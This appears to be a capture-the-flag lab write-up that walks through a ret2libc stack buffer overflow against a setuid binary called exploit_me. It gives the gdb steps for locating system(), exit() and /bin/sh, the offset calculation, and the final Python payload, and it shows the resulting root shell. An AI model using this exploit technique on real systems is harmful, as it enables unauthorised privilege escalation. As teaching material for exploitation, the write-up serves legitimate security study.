# Buffer overflow identification.

In this user's home directory there is one binary called `exploit_me` and a `mail` directory. Let's forget about the directory and focus on the binary. Using `gdb` we can see the following.

```gdb
  $> gdb ./exploit_me
  (gdb) disas main
  Dump of assembler code for function main:
    0x080483f4 <+0>:     push   %ebp
    0x080483f5 <+1>:     mov    %esp,%ebp
    0x080483f7 <+3>:     and    $0xfffffff0,%esp
    0x080483fa <+6>:     sub    $0x90,%esp
    0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp) // Check for 1 argument
    0x08048404 <+16>:    jg     0x804840d <main+25>
    0x08048406 <+18>:    mov    $0x1,%eax
    0x0804840b <+23>:    jmp    0x8048436 <main+66>
    0x0804840d <+25>:    mov    0xc(%ebp),%eax
    0x08048410 <+28>:    add    $0x4,%eax
    0x08048413 <+31>:    mov    (%eax),%eax
    0x08048415 <+33>:    mov    %eax,0x4(%esp)
    0x08048419 <+37>:    lea    0x10(%esp),%eax
    0x0804841d <+41>:    mov    %eax,(%esp)
    0x08048420 <+44>:    call   0x8048300 <strcpy@plt> // Copy $ebp somewhere else
    0x08048425 <+49>:    lea    0x10(%esp),%eax
    0x08048429 <+53>:    mov    %eax,(%esp)
    0x0804842c <+56>:    call   0x8048310 <puts@plt> // Prints the result of strcpy()
    0x08048431 <+61>:    mov    $0x0,%eax
    0x08048436 <+66>:    leave
    0x08048437 <+67>:    ret
  End of assembler dump.
```

> Apparently, this program need one argument. It simply use [`strcpy()`](https://man7.org/linux/man-pages/man3/strcpy.3.html) to copy whatever we send before printing it using [`puts()`](https://man7.org/linux/man-pages/man3/puts.3.html). As stated in the man of `strcpy()`, If the destination string of a `strcpy()` is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.

We can create a **buffer overflow** that will override what's stored on [EIP register](https://security.stackexchange.com/questions/129499/what-does-eip-stand-for), to execute arbitrary code. This exploit is called a [ret2libc attack](https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3). To perform this attack we'll need few things:

- Find where [`system()`](https://man7.org/linux/man-pages/man3/system.3.html), [`exit()`](https://man7.org/linux/man-pages/man3/exit.3.html) and `/bin/sh` are stored in memory.
- Find where the buffer and EIP addresses are.

# Analyze program and environment.

Let's use a quick gdb routine to get these informations...

```gdb
file /home/zaz/exploit_me
b *0x08048425
r 0000000000000000000000000000
p &system
p &exit
find &system, +999999999, "/bin/sh"
x $esp
info frame
```

> We create a breakpoint after `strcpy()` to locate where is the buffer using [ESP register](https://stackoverflow.com/questions/21718397/what-are-the-esp-and-the-ebp-registers), then we run the program with some arbitrary input. Get the adresses of `system()`, `exit()` and locate adress of `/bin/sh` between adresses of system and the rest of memory space. Finally fetch `esp` and `eip` using the [stack frame](https://www.techopedia.com/definition/22304/stack-frame#:~:text=A%20stack%20frame%20is%20a,pertaining%20to%20a%20subprogram%20call.&text=A%20stack%20frame%20also%20known%20as%20an%20activation%20frame%20or%20activation%20record.).

Running this routine gives the following:

```gdb
  $> gdb -x ret2libc.gdb --batch
  Breakpoint 1 at 0x8048425

  Breakpoint 1, 0x08048425 in main ()
  $1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
  $2 = (<text variable, no debug info> *) 0xb7e5ebe0 <exit>  
  0xb7f8cc58
  warning: Unable to access target memory at <SOME-ADRESS>, halting search.
  1 pattern found.
  <SOME-ADRESS>: 0xbffff5b0
  Stack level 0, frame at <SOME-ADRESS>:
    eip = 0x8048425 in main; saved eip <SOME-ADRESS>
    Arglist at <SOME-ADRESS>, args:
    Locals at <SOME-ADRESS>, Previous frame's sp is <SOME-ADRESS>
    Saved registers:
      ebp at <SOME-ADRESS>, eip at 0xbffff63c
```

> `system()` is at address `0xb7e6b060`, `exit()` at `0xb7e5ebe0` and `/bin/sh` at `0xb7f8cc58`. **ESP** is at `0xbffff5b0` and **EIP** is at `0xbffff63c` in this case.

Now we need to check few things before trying to exploit this vulnerability. First, [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) must be off and the [endianness](https://en.wikipedia.org/wiki/Endianness) of this machine.

```shell
  $> sysctl kernel.randomize_va_space
  kernel.randomize_va_space = 0
  $> lscpu | grep Endian
  Byte Order: Little Endian
```

> According to this [thread](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization), **ASLR** is disabled, and this machine is in little endian, we'll need to reverse byte order to get the right addresses.

# Compute buffer offset.

In order to perform this attack we need to generate a segfault in the program. In this case, it means to find the offset from which we start to override stored addresses in **EIP**. To do so, we simply substract the address of **ESP** to **EIP**.

```shell
 $> echo 'ibase=16; BFFFF63C - BFFFF5B0' | bc
 140
```

> Thanks to [`bc`](https://linux.die.net/man/1/bc) we can quickly substract these two by specifying the input base, here **hexadecimal** (16).

Now that we know that the offset must be **140 bytes** we can check it easily using [python string multiplication](https://www.pythoncentral.io/use-python-multiply-strings/).

```shell
  $> ./exploit_me `python -c "print '0' * 139"`
  0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  $> ./exploit_me `python -c "print '0' * 140"`
  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
  Illegal instruction (core dumped)
```

> **139 bytes** works perfectly, **140 and above** segfaults.

# Ret2libc attack.

Final step is to construct a sequence of bytes after this offset that will execute in order `system()`, `exit()` and finally `/bin/sh` and we have all these addresses to do so!

```shell
  $> ./exploit_me `python -c 'print("0"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
  00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`X
  # id
  uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
  # whoami
  root
```

> In Python, `[::-1]` is a way to reverse string, needed here to swap between big and litle endian.

As you can see, we are now root on this machine!
